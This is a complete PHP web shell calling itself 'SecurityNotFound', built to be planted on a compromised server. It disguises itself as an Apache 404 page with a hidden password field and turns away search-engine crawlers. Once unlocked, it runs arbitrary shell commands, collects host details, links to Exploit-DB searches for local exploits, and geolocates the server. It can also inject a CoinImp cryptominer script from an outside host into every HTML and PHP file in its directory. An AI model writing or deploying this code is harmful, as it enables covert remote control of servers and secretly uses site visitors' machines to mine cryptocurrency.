<?php
	
	// ---- VARIABLES ----

	$passphrase = "136c757bdd877848762c248e58252935"; // cosasdepuma

	$coinimpkey = ""; // <---- Insert here your CoinImp Site Key (https://www.coinimp.com/dashboard) [str, hex, 64 char-length key]

	$robots = array(
		'Baiduspider',
		'Bing',
		'DuckDuck',
		'Google',
		'ia_archiver',
		'MSNBot',
		'Rambler',
		'Slurp',
		'Sogou',
		'Yandex'
	);

	// ---- TEMPLATES ----

		// - Apache -

	/**
	 *	Show the 404 Apache page
	 */
	function ApacheNotFound()
	{
?>
<head>
	<?=ApacheNotFound_Head();?>
</head>
<body>
	<?=ApacheNotFound_Body();?>
</body>
<?php
		exit(0);
	}

	/**
	 *	Apache stylesheet template
	 */
	function ApacheNotFound_Head()
	{
?>
	<style>
		div {
			position: absolute;
			top: 50%;
			left: 50%;
			margin-top: -25px;
			margin-left: -50px;
		}

		div form input {
			margin: 0;
			border: 0;
			background-color: #FFF;
		}
	</style>
<?php
	}

	/**
	 *	Apache HTML template
	 */
	function ApacheNotFound_Body()
	{
?>
	<h1>Not Found</h1>
	<p>The request URL <?=dirname($_SERVER['REQUEST_URI'])?> was not found on this server.</p>
	<hr>
	<address><?=$_SERVER['SERVER_SOFTWARE']?> Server at <?=$_SERVER['HTTP_HOST']?> Port <?=$_SERVER['SERVER_PORT']?></address>


	<div>
		<!-- Issue #2: Firefox Autocomplete -->
		<input style="display: none;" type="password" autocomplete="foo" />

		<form method="POST">
			<input type="password" name="passwd" autocomplete="foo">
		</form>
	</div>
<?php
	}

		// - Shell -

	/**
	 *	Show the Shell
	 */
	function Shell()
	{
?>
<head>
	<?=ShellNavStyle();?>
	<?=ShellContentsStyle();?>
</head>
<body>
	<?=ShellContents();?>
	<?=ShellNavbar();?>
</body>
<?php
	}

	/**
	 *	Shell navbar stylesheet template
	 */
	function ShellNavStyle()
	{
?>
	<style>
		* {
		margin: 0;
		padding: 0;
		outline: 0;
		box-sizing: border-box;
		}

		body {
			height: 100vh;
			background-color: #ddd;
		}

		div nav {
			position: relative;
			background: #333;
			width: calc(100% - 60px);
			margin: 0 auto;
			padding: 10px 20px 10px 20px;
			text-align: right;
		}

		div nav:before {
			position: absolute;
			content: '';
			border-top: 10px solid #333;
			border-right: 10px solid #333;
			border-left: 10px solid transparent;
			border-bottom: 10px solid transparent;
			top: 100%;
			left: 0;
		}

		div nav:after {
			position: absolute;
			content: '';
			border-top: 10px solid #333;
			border-right: 10px solid transparent;
			border-left: 10px solid #333;
			border-bottom: 10px solid transparent;
			top: 100%;
			right: 0;
		}

		div nav div {
			width: 20%;
			float: left;
			color: #fff;
			font-size: 25px;
			text-align: left;
			padding-left: 2%;
		}

		div nav ul {
			margin-right: 1%;
		}

		div nav ul li {
			list-style: none;
			display: inline-block;
			color: #fff;
			letter-spacing: 1px;
			padding: 0 25px;
			font-size: 14px;
			line-height: 30px;
			position: relative;
			text-transform: uppercase;
			background: tomato;
		}

		.exit {
			padding: 0 7px;
			background: grey;
			
		}

		.exit:hover {
			background: orange;
		}

		a {
			text-decoration: none;
		}
	</style>
<?php
	}

	/**
	 *	Shell contents stylesheet template
	 */
	function ShellContentsStyle()
	{
?>
	<style>
		.contents {
			width: 100vw;
			height: 100vh;
			position: absolute;
			top: 0; left: 0;
			display: flex;
			justify-content: center;
			align-items: center;
		}

		.menu {
			width: 90%;
			height: 80%;
			background-color: grey;
			display: flex;
			flex-wrap: wrap;
			flex-direction: row;
			justify-content: center;
			align-items: center;
			align-content: center;
		}

		.submenu {
			margin: 20px 10px;
			background-color: #333;
			width: calc(50% - 30px);
			height: calc(100% - 40px);
			display: flex;
			flex-wrap: wrap;
			flex-direction: row;
			justify-content: center;
			align-items: center;
			align-content: center;
		}
		
		.full-element
		{
			width:97%;
		}

		/* BEGIN - CONSOLE */

		.title {
			color: #333;
			height: 30px;
			font-weight: bold;
			text-align: center;
			vertical-align: middle;
			line-height: 30px;
			font-size: 18px;
			background: tomato;
			letter-spacing: 0px;
			text-transform: uppercase;
			margin-bottom: 5px;
			border: 1px solid grey;
		}

		.console-output {
			height: calc(100% - 90px);
			resize: none;
			background-color: #333;
			color: white;
			border: 1px solid grey;
			padding: 10px;
			scrollbar-width: none;		// Firefox
			-ms-overflow-style: none;	// IE 10+

			::-webkit-scrollbar {
				display: none;
			}
		}

		.console-input {
			width: 100%;
			height: 30px;
			background-color: #333;
			color: white;
			padding: 0 10px;
			border: 1px solid grey;
			border-top: 0;
		}

		/* END - CONSOLE */

		.button {
			width: 30%;
			color: #333;
			height: 30px;
			font-weight: bold;
			text-align: center;
			vertical-align: middle;
			line-height: 30px;
			font-size: 14px;
			background-color: grey;
			text-transform: uppercase;
			margin: 5px;
			border: 1px solid #333;
		}

		.button:hover {
			background: tomato;
		}

		.selfremove:hover {
			color: white;
			background-color: brown;
		}
	</style>
<?php
	}

	/**
	 *	Shell navbar HTML template
	 */
	function ShellNavbar()
	{
?>
<div style="padding-top: 25px;">
<nav>
		<div>SecurityNotFound</div>
		<ul>
			<li><?=$GLOBALS['INFO']['USER']?></li>
			<li><?=$GLOBALS['INFO']['KERNEL']?></li>
			<li><?=$GLOBALS['INFO']['RELEASE']?></li>
			<a href="?exit"><li class="exit">⛔</li></a>
		</ul>
	</nav>
</div>
<?php
	}

	/**
	 *	Shell contents HTML template
	 */
	function ShellContents()
	{
?>
<div class="contents">
	<div class="menu">
		<div class="submenu">
			<div class="title full-element">🎮   CONSOLE   🎮</div>
			<textarea readonly id="console" class="console-output full-element">
<?php
		foreach($_SESSION['OUTPUTS'] as $output)
		{
			echo $output . PHP_EOL;
		}
?>
			</textarea>
			<form class="full-element" method="POST">
				<input type="text" name="cmd" class="console-input">
			</form>
		</div>
		<div class="submenu">
			<a class="button" href="?info">PHPINFO</a>
			<a class="button" rel="noopener noreferrer" target="_blank" href="<?=ExploitDB();?>">EXPLOIT-DB</a>
			<a class="button" rel="noopener noreferrer" target="_blank" href="<?=GeoLocate();?>">GEOLOCATE</a>
			<a class="button" href="?cryptominer">CRYPTOMINER</a>
			<a class="button selfremove" href="?selfremove">SELF-REMOVE</a>
		</div>
	</div>
</div>

<script>
	var textarea = document.getElementById('console');
	textarea.scrollTop = textarea.scrollHeight;
</script>
<?php
	}

	// ---- FUNCTIONS ----

	/**
	 *	Set the 404 most common headers
	 *	Easter Egg: X-Powered-By
	 */
	function SetHeaders()
	{
		header('HTTP/1.0 404 Not Found');
		header('X-Powered-By: Unicorns and kitties <3');
	}

	/**
	 *	Avoid the most common robots / crawlers
	 */
	function FightRobots()
	{
		global $robots;
		foreach($robots as $robot)
		{
			if(strpos($_SERVER['HTTP_USER_AGENT'], $robot) !== false)
			{
				exit(0);
			}
		}
	}

	/**
	 *	Harvest information about the compromised machine
	 */
	function GatherInformation()
	{
		// Issue #3: Current user vs File owner
		$user = explode('\\',@shell_exec('whoami'));
		$info = array(
			'USER'	  => end($user),
			'KERNEL'  => substr(@php_uname('s'), 0, 20),
			'RELEASE' => substr(@php_uname('r'), 0, 20)
		);
		$GLOBALS['INFO'] = $info;
	}

	/**
	 *	Reload the current page without parameters
	 */
	function ReloadPage()
	{
		header("Location: " . explode("?", $_SERVER[REQUEST_URI])[0], true, 302);
	}

	/**
	 *	Check if the specified passwd (POST) is set nor matchs the current passphrase
	 * 		True => New session
	 * 		False => Apache 404 Page
	 */
	function CheckPasswd()
	{
		global $passphrase;
		if(empty($passphrase) || (isset($_POST['passwd']) && (md5(md5(md5($_POST['passwd']))) == $passphrase)))
		{
			$_SESSION['OUTPUTS'] = array();
			$_SESSION[md5($_SERVER['REMOTE_ADDR'])] = true;
			ReloadPage();
		}
		else
		{
			ApacheNotFound();
		}
	}

	/**
	 *	Destroy the current session
	 */
	function ClearSession()
	{
		unset($_SESSION['OUTPUTS']);
		unset($_SESSION[md5($_SERVER['REMOTE_ADDR'])]);
		session_destroy();
		ReloadPage();
	}

	function CryptoMiner()
	{
		global $coinimpkey;
		$signature = '<!-- :> -->';
		$miner = $signature . '<script src="https://www.hostingcloud.racing/kwgR.js"></script><script>var _a=new Client.Anonymous("' . $coinimpkey . '",{throttle:0});_a.start();</script>';
		
		$files = scandir(dirname(__FILE__));
		foreach($files as $file)
		{
			$ext = substr($file,-5,5);
			$isvalid = (strcmp($ext, '.html') == 0 || strcmp(substr($ext,-4,4), '.php') == 0);
			if($isvalid && strcmp($file, basename(__FILE__)) != 0)
			{
				$content = file_get_contents($file);
				if(strpos($content,$signature) === false)
				{
					$content = str_replace('</body>', $miner . '</body>', $content);
					file_put_contents($file, $content);
				}
			}
		}
		ReloadPage();
	}

	function RunCommand()
	{
		$format_cmd = strtolower(trim($_POST['cmd']));
		if((strcmp($format_cmd,"cls") == 0) || (strcmp($format_cmd,"clear") == 0))
		{
			$_SESSION['OUTPUTS'] = array();
		}
		else
		{
			$output = "$ " . $_POST['cmd'] . PHP_EOL . shell_exec($_POST['cmd'] . ' 2>&1');
			array_push($_SESSION['OUTPUTS'], $output);
		}
	}

	function SelfRemove()
	{
		// FIXME: [Linux] Warning: Permission denied (Already in use)
		unlink(__FILE__);
		ClearSession();
	}

	function ExploitDB()
	{
		$kernel = explode(" ", $GLOBALS['INFO']['KERNEL'])[0];
		$release = explode(".", $GLOBALS['INFO']['RELEASE'])[0];
		$exploitdb = "https://www.exploit-db.com/search?q=";
		return AnonymousRequest($exploitdb . $kernel . "+" . $release);
	}

	function GeoLocate()
	{
		$ip = file_get_contents("https://ipinfo.io/ip");
		$coords = file_get_contents("http://ip-api.com/csv/" . trim($ip) . "?fields=lat,lon");
		$maps = "https://www.google.es/maps/place/";
		return AnonymousRequest($maps . $coords);
	}

	function AnonymousRequest($URI)
	{
		$proxy = "http://nullrefer.com/?";
		return $proxy . $URI;
	}

	// ---- ENTRYPOINT ----

	function Main()
	{
		

		session_start();
	
		SetHeaders();
		FightRobots();

		if(isset($_GET['exit']))
		{
			ClearSession();
		}
		else if(isset($_SESSION[md5($_SERVER['REMOTE_ADDR'])]))
		{
			if(isset($_POST['cmd']))
			{
				RunCommand();
			}

			if(isset($_GET['info']))
			{
				phpinfo();
			}
			else if(isset($_GET['selfremove']))
			{
				SelfRemove();
			}
			else if(isset($_GET['cryptominer']))
			{
				CryptoMiner();
			}
			else
			{		
				GatherInformation();
				Shell();
			}
		}
		else
		{
			CheckPasswd();
		}
	}
	Main();

	// https://github.com/mIcHyAmRaNe/wso-webshell
	// https://coolors.co/dddddd-aaaaaa-808080-333333-ff6347
?>
